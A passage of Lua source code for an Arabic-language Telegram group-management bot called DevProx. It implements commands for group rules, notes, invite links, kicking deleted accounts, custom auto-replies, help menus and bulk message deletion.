Dev_Abs(msg.chat_id_, msg.id_, 1, '🎖┇ تم وضع قوانين المجموعه ', 1, 'md')
end
end
if text:match("^ضع قوانين (.*)$") then
local txt = {string.match(text, "^(ضع قوانين) (.*)$")}
DevAbs:set(DevProx..'bot:rules'..msg.chat_id_, txt[2])
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Group rules has been saved ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎖┇ تم وضع قوانين المجموعه ', 1, 'md')
end
end
end
-------------------------------------------DevProx----------------------------------------------------
if text:match("^ضع ملاحظه (.*)$") and is_leader(msg) then
local txt = {string.match(text, "^(ضع ملاحظه) (.*)$")}
DevAbs:set(DevProx..'owner:note1', txt[2])
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Saved ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎖┇ تم حفظ الملاحظه ارسل جلب الملاحظه لعرضها ', 1, 'md')
end
end
---------------------------------------DevProx--------------------------------------------------------
if text:match("^جلب الملاحظه$") and is_leader(msg) then
local note = DevAbs:get(DevProx..'owner:note1')
Dev_Abs(msg.chat_id_, msg.id_, 1, note, 1, nil)
end
-----------------------------------DevProx--------------------------------------------------------------
if text:match("^[Rr]ules$") or text:match("^القوانين$") then
local rules = DevAbs:get(DevProx..'bot:rules'..msg.chat_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, rules, 1, nil)
end
-----------------------------------------------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^الروابط$") then
if DevAbs:get(DevProx..'bot:links:mute'..msg.chat_id_) then
mute_links = 'مقفوله 🌟'
else
mute_links = 'مفتوحه 🛢'
end
local DevProx = "🎖┇ اعدادات الروابط 🔻 :\n\n"
.." الروابط : "..mute_links.."\n"
Dev_Abs(msg.chat_id_, msg.id_, 1, DevProx, 1, 'md')
end
end
--     Source DevProx     --
if text:match("^ضع اسم (.*)$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
local txt = {string.match(text, "^(ضع اسم) (.*)$")}
changetitle(msg.chat_id_, txt[2])
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Group name has been changed ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎖┇ تم تغيير اسم المجموعه ', 1, 'md')
end
end
--     Source DevProx     --
if text:match("^ضع صوره$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Plese send group photo ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎖┇ ارسل لي الصوره الان ', 1, 'md')
end
DevAbs:set(DevProx..'bot:setphoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
--     Source DevProx     --
if text:match('^gplist$') or text:match('^المجموعات$') then
local list = DevAbs:smembers(DevProx.."bot:groups")
local t = '📤┇ مجموعات البوت \n\n'
for k,v in pairs(list) do
t = t..k.." - {`"..v.."`}\n" 
end
if #list == 0 then
t = '📛┇ لا يوجد مجموعات مفعله '
end
Dev_Abs(msg.chat_id_, msg.id_, 1,t, 1, 'md')
end
--     Source DevProx     --
if text:match("^الغاء تثبيت$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
unpinmsg(msg.chat_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم الغاء تثبيت الرساله ', 1, 'md')
end
if text:match("^اعاده تثبيت$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
local pin_id = DevAbs:get(DevProx..'pinnedmsg'..msg.chat_id_)
if pin_id then
pin(msg.chat_id_,pin_id,0)
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم اعاده تثبيت الرساله ', 1, 'md')
else
end
end       
--     Source DevProx     --
if text:match("^kick delete$") or text:match("^طرد الحسابات المحذوفه$") then
local function deleteaccounts(extra, result)
for k,v in pairs(result.members_) do 
local function cleanaccounts(extra, result)
if not result.first_name_ then
changeChatMemberStatus(msg.chat_id_, result.id_, "Kicked")
end
end
getUser(v.user_id_, cleanaccounts, nil)
end 
Dev_Abs(msg.chat_id_, msg.id_, 0,'📤┇ تم طرد الحسابات المحذوفه ', 1, 'md')
end 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,offset_ = 0,limit_ = 1096500}, deleteaccounts, nil)
end
--     Source DevProx     --
if text:match("^clean kicked$") or text:match("^تنظيف قائمه الحظر$") then
local function removeblocklist(extra, result)
if tonumber(result.total_count_) == 0 then 
Dev_Abs(msg.chat_id_, msg.id_, 0,'📛┇ لا يوجد محظورين ', 1, 'md')
else
local x = 0
for x,y in pairs(result.members_) do
x = x + 1
changeChatMemberStatus(msg.chat_id_, y.user_id_, 'Left', dl_cb, nil)
end
Dev_Abs(msg.chat_id_, msg.id_, 0,'📤┇ تم تنظيف قائمه حظر الكروب ', 1, 'md')
end
end
getChannelMembers(msg.chat_id_, 0, 'Kicked', 200, removeblocklist, {chat_id_ = msg.chat_id_, msg_id_ = msg.id_}) 
end
--     Source DevProx     --
if text:match("^(gpinfo)$") or text:match("^معلومات المجموعه$") then
function gpinfo(arg,data)
-- vardump(data) 
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ ايدي المجموعة » ( '..msg.chat_id_..' )\n🚸┇ عدد الادمنيه » ( *'..data.administrator_count_..' )*\n📛┇ عدد المحظورين » ( *'..data.kicked_count_..' )*\n🏆┇ عدد الاعضاء » ( *'..data.member_count_..' )*\n', 1, 'md') 
end 
getChannelFull(msg.chat_id_, gpinfo, nil) 
end
--     Source DevProx     --
if text == 'تفعيل البوت الخدمي' then 
local  DevProx = '📤┇ تم تفعيل البوت الخدمي '
Dev_Abs( msg.chat_id_, msg.id_, 1, DevProx, 1, "md") 
DevAbs:del(DevProx..'lock:bot:free'..bot_id) 
end 
if text == 'تعطيل البوت الخدمي' then 
DevProx = '📤┇ تم تعطيل البوت الخدمي '
Dev_Abs( msg.chat_id_, msg.id_, 1, DevProx, 1, "md") 
DevAbs:set(DevProx..'lock:bot:free'..bot_id,true) 
end
if text == 'تفعيل اللعبه' then   
Dev_Abs(msg.chat_id_, msg.id_, 1,[[*
🏷┇ اهلا بك في قائمه الالعاب ↓↓
➖➖➖➖➖➖➖
🏆┇ الالعاب المتوفره بالبوت ↓↓
➖➖➖➖➖➖➖
📤┇ ارسل امر { ترتيب } لبدء لعبه 
🚸┇ ارسل امر { سمايلات } لبدء لعبه 
📥┇ ارسل امر { حزوره } لبدء لعبه 
🛎┇ ارسل امر { المعاني } لبدء لعبه 
🏆┇ ارسل امر { العكس } لبدء لعبه 
👊🏻┇ ارسل امر { المحيبس } لبدء لعبه 
⏱┇ ارسل امر { امثله } لبدء لعبه 
🔔┇ ارسل امر { المختلف } لبدء لعبه 
➖➖➖➖➖➖➖
🔊┇ قناة السورس *[@DEV_PROX] 
]], 1, 'md')
DevAbs:set(DevProx..'bot:lock_geam'..msg.chat_id_,true)  
end
if text == 'تعطيل اللعبه' then  
DevProx = '*🚏 ┇ تم تعطيل اللعبه ✅*'  
Dev_Abs(msg.chat_id_, msg.id_, 1,DevProx, 1, 'md')
DevAbs:del(DevProx..'bot:lock_geam'..msg.chat_id_) 
end
if text == 'تفعيل جلب الصوره' and is_owner(msg.sender_user_id_, msg.chat_id_) then   
if DevAbs:get(DevProx..'lock:get:photo'..msg.chat_id_) then
DevProx = '*🚏 ┇ تم تفعيل جلب الصوره الشخصيه ✅*' 
Dev_Abs( msg.chat_id_, msg.id_, 1, DevProx, 1, "md") 
DevAbs:del(DevProx..'lock:get:photo'..msg.chat_id_) 
else
DevProx = '*🚏 ┇ جلب الصوره الشخصيه مفعل مسبقا ✅*' 
Dev_Abs( msg.chat_id_, msg.id_, 1, DevProx, 1, "md") 
end
end
if text == 'تعطيل جلب الصوره' and is_owner(msg.sender_user_id_, msg.chat_id_) then   
if not DevAbs:get(DevProx..'lock:get:photo'..msg.chat_id_) then
DevProx = '*🚏 ┇ تم تعطيل جلب الصوره الشخصيه ✅*'  
Dev_Abs( msg.chat_id_, msg.id_, 1, DevProx, 1, "md") 
DevAbs:set(DevProx..'lock:get:photo'..msg.chat_id_,true) 
else
DevProx = '*🚏 ┇ جلب الصوره الشخصيه معطل مسبقا ✅*'  
Dev_Abs( msg.chat_id_, msg.id_, 1, DevProx, 1, "md") 
end
end
if text and text == "تفعيل الرابط" then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '🧫┇تم تفعيل الرابط ', 1, 'md')
DevAbs:del(DevProx.."bot:tt:link:"..msg.chat_id_)
end
if text and text == "تعطيل الرابط" then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⛓┇تم تعطيل الرابط ', 1, 'md')
DevAbs:set(DevProx.."bot:tt:link:"..msg.chat_id_,"ok")
end
if text:match('^تفعيل$') then
function adding(extra,result,success)
local txt = {string.match(text, "^(تفعيل)$")}
local function promote_admin(extra, result, success)
local admins = result.members_
for i=0 , #admins do
DevAbs:sadd(DevProx..'bot:momod:'..msg.chat_id_,admins[i].user_id_)
if result.members_[i].status_.ID == "ChatMemberStatusCreator" then
owner_id = admins[i].user_id_
DevAbs:sadd(DevProx.."bot:monsh:"..msg.chat_id_,owner_id)
end
end
end
getChannelMembers(msg.chat_id_, 0, 'Administrators', 200, promote_admin)
if DevAbs:get(DevProx.."bot:enable:"..msg.chat_id_) then
if not DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم تفعيل المجموعه سابقا ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎖┇ Group Actually added ', 1, 'md')
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎖┇ Group has been added ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ عزيزي المطور \n☑️ ┇ تم تفعيل المجموعه \n📬 ┇ تم ترفع منشئ المجموعه \n📨 ┇ تم رفع ادمنيه المجموعه ', 1, 'md')
end
openChat(msg.chat_id_,DevProx)
DevAbs:sadd("DevProx:addg"..bot_id, msg.chat_id_)
function DevProx(A1,A2)
function dl_cb222(t1,t2)
if t2.invite_link_ == false then 
local getlink = 'https://api.telegram.org/bot'..tokenbot..'/exportChatInviteLink?chat_id='..msg.chat_id_
local req = https.request(getlink)
local link = JSON:decode(req)
if link.ok == true then 
  t2.invite_link_ = link.result
end
end
DevAbs:set(DevProx.."bot:group:link"..msg.chat_id_,(t2.invite_link_ or "Error")) 
Dev_Abs(tostring((DevAbs:get(DevProx.."bot:leader:gr") or bot_owner)), 0, 1, "🏆┇ تم تفعيل مجموعه جديده  \n📤┇ ايدي الضافني ~ {"..msg.sender_user_id_.."}\n🚸┇ معرف الضافني ~ @"..(result.username_ or "لا يوجد").."\n📥┇ معلومات المجموعه  \n\n📂┇ ايدي المجموعه ~ {"..msg.chat_id_.."}\n🛢┇ اسم المجموعه  {"..A2.title_.."}\n☑️┇ رابط المجموعه \n🚠┇  {"..(t2.invite_link_ or "Error").."}" , 1, 'html') 
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, dl_cb222, nil)
end
openChat(msg.chat_id_,DevProx) 
DevAbs:set(DevProx.."bot:enable:"..msg.chat_id_,true)
DevAbs:setex(DevProx.."bot:charge:"..msg.chat_id_,86400,true)
DevAbs:sadd("DevProx:addg"..bot_id, msg.chat_id_)
local send_to_bot_owner = function(extra, result)
local v = tonumber(bot_owner)             
end
end
end
getUser(msg.sender_user_id_,adding)
end
--     Source DevProx     --
if text:match('^تعطيل$') and is_admin(msg.sender_user_id_, msg.chat_id_) then
local txt = {string.match(text, "^(تعطيل)$")}
if not DevAbs:get(DevProx.."bot:enable:"..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎖┇ Group Actually Rem ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ المجموعه معطله سابقا ', 1, 'md')
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎖┇ Group has been Rem ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🎖┇ تم تعطيل المجموعه ', 1, 'md')
end
DevAbs:del(DevProx.."bot:charge:"..msg.chat_id_)
DevAbs:del(DevProx.."bot:enable:"..msg.chat_id_)
DevAbs:srem("DevProx:addg"..bot_id, msg.chat_id_)
local v = tonumber(bot_owner)          
end
end
if text:match('^[Rr]em(-%d+)$') and is_admin(msg.sender_user_id_, msg.chat_id_) then
local gp = {string.match(text, "^([Rr]em)(-%d+)$")}
DevAbs:del(DevProx.."bot:charge:"..gp[2])
local v = tonumber(bot_owner)       
end
if text:match("^تفعيل كل الكروبات$") then
local gps = DevAbs:smembers(DevProx.."bot:groups") or 0
local gps2 = DevAbs:smembers("DevProx:addg"..bot_id) or 0
for i=1,#gps do
DevAbs:sadd("DevProx:addg"..bot_id, gps[i])
DevAbs:set(DevProx.."bot:enable:"..gps[i],true)
DevAbs:set( DevProx.."bot:charge:"..gps[i],true)
end
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم تفعيل المجموعات *{'..(#gps - #gps2)..'}*', 1, 'md')
end   
if text:match("^تعطيل كل الكروبات$") then
local gps = DevAbs:smembers(DevProx.."bot:groups") or 0
local gps2 = DevAbs:smembers("DevProx:addg"..bot_id) or 0
for i=1,#gps do
DevAbs:del("DevProx:addg"..bot_id, gps[i])
DevAbs:del(DevProx.."bot:enable:"..gps[i],true)
DevAbs:del( DevProx.."bot:charge:"..gps[i],true)
end
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم تعطيل *{'..(#gps - #gps2)..'} مجموعه*', 1, 'md')
end   

if text:match("^الدعم$") or text:match("^المطور$") then
function adding(extra,result,success)
function DevProx(A1,A2)
function dl_cb222(t1,t2)
if t2.invite_link_ == false then 
local getlink = 'https://api.telegram.org/bot'..tokenbot..'/exportChatInviteLink?chat_id='..msg.chat_id_
local req = https.request(getlink)
local link = JSON:decode(req)
if link.ok == true then 
  t2.invite_link_ = link.result
end
end
DevAbs:set(DevProx.."bot:group:link"..msg.chat_id_,(t2.invite_link_ or "Error")) 
Dev_Abs(tostring((DevAbs:get(DevProx.."bot:leader:gr") or bot_owner)), 0, 1, "🏆┇ هناك من بحاجه للمساعده  \n📤┇ ايدي الشخص ~ {"..msg.sender_user_id_.."}\n🚸┇ معرف الشخص ~ @"..(result.username_ or "لا يوجد").."\n📥┇ معلومات المجموعه  \n\n📂┇ ايدي المجموعه ~ {"..msg.chat_id_.."}\n🛢┇ اسم المجموعه  {"..A2.title_.."}\n☑️┇ رابط المجموعه \n🚠┇  {"..(t2.invite_link_ or "Error").."}" , 1, 'html') 
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, dl_cb222, nil)
end
openChat(msg.chat_id_,DevProx) 
end
getUser(msg.sender_user_id_,adding)
end
--     Source DevProx     --
if text == 'جلب نسخه الملف' then
if not is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ للمطور الاساسي فقط ', 1, 'md')
else
if not DevAbs:get(DevProx..'lock:add'..msg.chat_id_) then
sendDocument(bot_owner, 0, 0, 1, nil, './DevProx.lua', dl_cb, nil)
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ عزيزي المطور تم ارسال نسخه الملف الى خاصك مع البوت ', 1, 'md')
end end end
--     Source DevProx     --
if text and text:match("^نشر بالخاص (.*)") and is_leader(msg) then
if not DevAbs:get(DevProx..'lock:add'..msg.chat_id_) then
local pm =  text:match("^نشر بالخاص (.*)")
local s2a = "📤┇ تم ارسال رسالتك الى \n🗳┇ (* GP *) شخص في خاص البوت \n‏"
local gp = tonumber(DevAbs:scard(DevProx.."bot:userss"))
gps = DevAbs:smembers(DevProx.."bot:userss")
text = s2a:gsub('GP',gp)
for k,v in pairs(gps) do
Dev_Abs(v, 0, 1,pm, 1, 'md')
end
Dev_Abs(msg.chat_id_, msg.id_, 1,text, 1, 'md')
end 
end
--     Source DevProx     --
text = msg.content_.text_
if msg.content_.text_ == 'حذف رد' and  is_owner(msg.sender_user_id_, msg.chat_id_) then
DevAbs:set(DevProx..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'','del_repgp1')
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ حسننا ارسل الكلمه التريد حذفها 📬" ,  1, "md")
return false
end
if msg.content_.text_ then
local content_text = DevAbs:get(DevProx..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
if content_text == 'del_repgp1' then
Dev_Abs(msg.chat_id_, msg.id_, 1,'📤┇ الكلمه *('..msg.content_.text_..')*\n تم حذفها ☑️',  1, "md")
DevAbs:del(DevProx..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
DevAbs:del(DevProx..'gif_repgp'..msg.content_.text_..''..msg.chat_id_..'')
DevAbs:del(DevProx..'voice_repgp'..msg.content_.text_..''..msg.chat_id_..'')
DevAbs:del(DevProx..'stecker_repgp'..msg.content_.text_..''..msg.chat_id_..'')
DevAbs:del(DevProx..'video_repgp'..msg.content_.text_..''..msg.chat_id_..'')
DevAbs:del(DevProx..'text_repgp'..msg.content_.text_..''..msg.chat_id_..'')
DevAbs:del(DevProx..'rep_owner'..msg.content_.text_..''..msg.chat_id_..'')
return false
end
end
--     Source DevProx     --
if msg.content_.text_ == 'اضف رد' and is_owner(msg.sender_user_id_, msg.chat_id_)  then
DevAbs:set(DevProx..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'','set_repgp')
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ حسننا ارسل لي الكلمه الان 📬" ,  1, "md")
return false    end
if msg.content_.text_ then
local content_DevProx2 = DevAbs:get(DevProx..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
if content_DevProx2 == 'set_repgp' then
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ حسننا ارسل لي الرد \n🏆┇ يمكنك اضافه { نص ، بصمه ، متحركه ، ملصق }" ,  1, "md")
DevAbs:set(DevProx..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'','save_repgp')
DevAbs:set(DevProx..'addreplaygp:'..msg.sender_user_id_..''..msg.chat_id_..'',msg.content_.text_)
DevAbs:sadd(DevProx..'rep_owner'..msg.chat_id_..'',msg.content_.text_)
return false
end
end
 text = msg.content_.text_
if msg.content_.text_ == 'حذف رد للكل' then
DevAbs:set(DevProx.."add:repallt"..msg.sender_user_id_,'del_rep1')
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ حسننا ارسل الكلمه التريد حذفها 📬" ,  1, "md")
return false
end
if msg.content_.text_ then
local content_text = DevAbs:get(DevProx.."add:repallt"..msg.sender_user_id_)
if content_text == 'del_rep1' then
Dev_Abs(msg.chat_id_, msg.id_, 1,'📤┇ الكلمه *('..msg.content_.text_..')*\n تم حذفها ☑️',  1, "md")
DevAbs:del(DevProx.."add:repallt"..msg.sender_user_id_)
DevAbs:del(DevProx.."gif_repall"..msg.content_.text_)
DevAbs:del(DevProx.."voice_repall"..msg.content_.text_)
DevAbs:del(DevProx.."stecker_repall"..msg.content_.text_)
DevAbs:del(DevProx.."video_repall"..msg.content_.text_)
DevAbs:del(DevProx.."text_repall"..msg.content_.text_)
DevAbs:del(DevProx.."rep_sudo",msg.content_.text_)
return false
end
end
--     Source DevProx     --
if msg.content_.text_ == 'اضف رد للكل' and is_sudo(msg) then
DevAbs:set(DevProx.."add:repallt"..msg.sender_user_id_,'set_rep')
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ حسننا ارسل لي الكلمه الان 📬" ,  1, "md")
return false    end
if msg.content_.text_ then
local content_DevProx2 = DevAbs:get(DevProx.."add:repallt"..msg.sender_user_id_)
if content_DevProx2 == 'set_rep' then
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ ارسل الرد \n🏆┇ يمكنك اضافه {نص ، بصمه ، متحركه ، ملصق}" ,  1, "md")
DevAbs:set(DevProx.."add:repallt"..msg.sender_user_id_,'save_rep')
DevAbs:set(DevProx.."addreply2:"..msg.sender_user_id_, msg.content_.text_)
DevAbs:sadd(DevProx.."rep_sudo",msg.content_.text_)
return false 
end    end
--     Source DevProx     --
if  msg.content_.text_ == 'الردود' and is_owner(msg.sender_user_id_, msg.chat_id_) then
local redod = DevAbs:smembers(DevProx..'rep_owner'..msg.chat_id_..'')
if #redod == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ لا توجد ردود مضافه 🏷" ,  1, "md")
else
msg_rep = '📤┇ ردود المجموعه \n'
for k,v in pairs(redod) do
msg_rep = msg_rep ..k..' ~ *{ '..v..' }* \n' 
end
Dev_Abs(msg.chat_id_, msg.id_, 1, msg_rep,1, 'md')
end
return false
end
--     Source DevProx     --
if msg.content_.text_ == 'حذف الردود' and is_owner(msg.sender_user_id_, msg.chat_id_) then
local redod = DevAbs:smembers(DevProx..'rep_owner'..msg.chat_id_..'')
if #redod == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ لا توجد ردود مضافه 🏷" ,  1, "md")
else
for k,v in pairs(redod) do
DevAbs:del(DevProx..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
DevAbs:del(DevProx..'gif_repgp'..v..msg.chat_id_)
DevAbs:del(DevProx..'voice_repgp'..v..msg.chat_id_)
DevAbs:del(DevProx..'stecker_repgp'..v..msg.chat_id_)
DevAbs:del(DevProx..'video_repgp'..v..msg.chat_id_)
DevAbs:del(DevProx..'text_repgp'..v..msg.chat_id_)
DevAbs:del(DevProx..'rep_owner'..msg.chat_id_..'',msg.content_.text_)
end
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ تم حذف جميع الردود ☑️" ,  1, "md")
return false
end
end
--     Source DevProx     --
if  msg.content_.text_ == "ردود المطور" and is_sudo(msg) then
local redod = DevAbs:smembers(DevProx.."rep_sudo")
if #redod == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ لا توجد ردود مضافه 🏷" ,  1, "md")
else
local i = 1
msg_rep = '📤┇ ردود المطور \n'
for k,v in pairs(redod) do
msg_rep = msg_rep ..k.." ~ *{ "..v.." }* \n"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, msg_rep,1, "md")
end
return false
end
--     Source DevProx     --
if msg.content_.text_ == "حذف ردود المطور" and is_sudo(msg) then
local redod = DevAbs:smembers(DevProx.."rep_sudo")
if #redod == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ لا توجد ردود مضافه 🏷" ,  1, "md")
else
for k,v in pairs(redod) do
DevAbs:del(DevProx.."add:repallt"..v)
DevAbs:del(DevProx.."gif_repall"..v)
DevAbs:del(DevProx.."voice_repall"..v)
DevAbs:del(DevProx.."stecker_repall"..v)
DevAbs:del(DevProx.."video_repall"..v)
DevAbs:del(DevProx.."text_repall"..v)
DevAbs:del(DevProx.."rep_sudo",msg.content_.text_)
end
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ تم حذف جميع ردود المطور ☑️" ,  1, "md")
return false
end
end 
--     Source DevProx     --
if text:match("^تغيير اسم البوت$") or text:match("^وضع اسم البوت$") then
if not is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ للمطور الاساسي فقط ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ ارسل لي اسم البوت الان ', 1, 'html')
DevAbs:set('DevProx:'..bot_id..'namebot'..msg.sender_user_id_..'', 'msg')
return false 
end
end
if text and text == 'حذف اسم البوت' then
if not is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ للمطور الاساسي فقط ', 1, 'md')
else
DevAbs:del('DevProx:'..bot_id..'name_bot')
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم حذف الاسم ', 1, 'html')
end end 
--     Source DevProx     --
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match('^حذف (%d+)$') then
local matches = {string.match(text, "^(حذف) (%d+)$")}
if msg.chat_id_:match("^-100") then
if tonumber(matches[2]) > 100 or tonumber(matches[2]) < 1 then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
pm = '📤┇ Please use a number greater than 1 and less than 100 '
else
pm = '📯┇ اختر رقم اكبر من 1 واقل من 100 🌟'
end
send(msg.chat_id_,0, 1, pm, 1, 'html')
else
tdcli_function ({
ID = "GetChatHistory",
chat_id_ = msg.chat_id_,
from_message_id_ = 0,
offset_ = 0,
limit_ = tonumber(matches[2])
}, delmsg, nil)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
pm ='📤┇ *'..matches[2]..' recent message removed* '
else
pm ='📤┇ '..matches[2]..' من الرسائل تم حذفها ✅'
end
Dev_Abs(msg.chat_id_,0, 1, pm, 1, 'html')
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
pm ='📤┇ This is not possible in the conventional group '
else
pm ='🚸┇ هناك خطا '
end
Dev_Abs(msg.chat_id_, msg.id_, 1, pm, 1, 'html')
end
end

if text:match('^[Cc]lean (%d+)$') then
local matches = {string.match(text, "^([Cc]lean) (%d+)$")}
if msg.chat_id_:match("^-100") then
if tonumber(matches[2]) > 100 or tonumber(matches[2]) < 1 then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
pm = '📤┇ Please use a number greater than 1 and less than 100 '
else
pm = '📯┇ اختر رقم اكبر من 1 واقل من 100 📤'
end

send(msg.chat_id_,0, 1, pm, 1, 'html')
else
tdcli_function ({
ID = "GetChatHistory",
chat_id_ = msg.chat_id_,
from_message_id_ = 0,
offset_ = 0,
limit_ = tonumber(matches[2])
}, delmsg, nil)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
pm ='📤┇ *'..matches[2]..' recent message removed* '
else
pm ='🚸┇ '..matches[2]..' من الرسائل تم حذفها ✅'
end

Dev_Abs(msg.chat_id_,0, 1, pm, 1, 'html')
end

else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
pm ='📤┇ This is not possible in the conventional group '
else
pm ='🚸┇ هناك خطا '
end

Dev_Abs(msg.chat_id_, msg.id_, 1, pm, 1, 'html')
end
end
end
--     Source DevProx     --
if is_leader(msg) and text:match("^استعاده الاوامر$") then
DevAbs:del(DevProx..'bot:help', text)
DevAbs:del(DevProx..'bot:help1', text)
DevAbs:del(DevProx..'bot:help2', text)
DevAbs:del(DevProx..'bot:help3', text) 
DevAbs:del(DevProx..'bot:help4', text)
DevAbs:del(DevProx..'bot:help5', text) 
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ تم استعاده الكلايش الاصليه ☑️" ,  1, "md") 
end
if is_leader(msg) and text:match("^تعيين الاوامر$") then
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ ارسل لي الكليشه الان " ,  1, "md")
DevAbs:set(DevProx..'bot:help0'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local DevProx =  DevAbs:get(DevProx..'bot:help0'..msg.sender_user_id_..'')
if DevProx == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ تم حفظ الكليشه الجديده " ,  1, "md")
DevAbs:set(DevProx..'bot:help0'..msg.sender_user_id_..'', 'no')
DevAbs:set(DevProx..'bot:help', text)
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
--     Source DevProx     --
if text:match("^الاوامر$") then
local help = DevAbs:get(DevProx..'bot:help')
local text =  [[
WELCOOME TO help list 🚁

🌍- هناك خمس قوائم لٲدارة المجموعة 
There are five list to mange the group
〰️➖〰️➖〰️➖〰️➖〰️
🔵 - (م1) — اوامـر ادارة المجموعة 
⚫️ - (م2) — اوامـر حماية المجموعة 
⚪️ - (م3) — اوامـر الطرد والرفع
🔴 - (م4) —  اوامـر اضـآفـيـة 
🔘 - (م5) —  اوامر ألمطورين 
〰️➖〰️➖〰️➖〰️➖〰️
- DEV - @IQ_ABS   🗞📌
- Channel - @DEV_PROX
]] 
Dev_Abs(msg.chat_id_, msg.id_, 1, (help or text), 1, 'md')
end
--     Source DevProx     --
if is_leader(msg) and text:match("^تعيين امر م1$") then
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ ارسل لي الكليشه الان " ,  1, "md")
DevAbs:set(DevProx..'bot:help01'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local DevProx =  DevAbs:get(DevProx..'bot:help01'..msg.sender_user_id_..'')
if DevProx == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ تم حفظ الكليشه الجديده " ,  1, "md")
DevAbs:set(DevProx..'bot:help01'..msg.sender_user_id_..'', 'no')
DevAbs:set(DevProx..'bot:help1', text)
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
--     Source DevProx     --
if text:match("^م1$") or  text:match("^م١$") then
local help = DevAbs:get(DevProx..'bot:help1')
local text =  [[
🚸❗️ #اوامر_حمايه_المجموعه 📮
✵•┈••●◆💈◆●••┈•✵
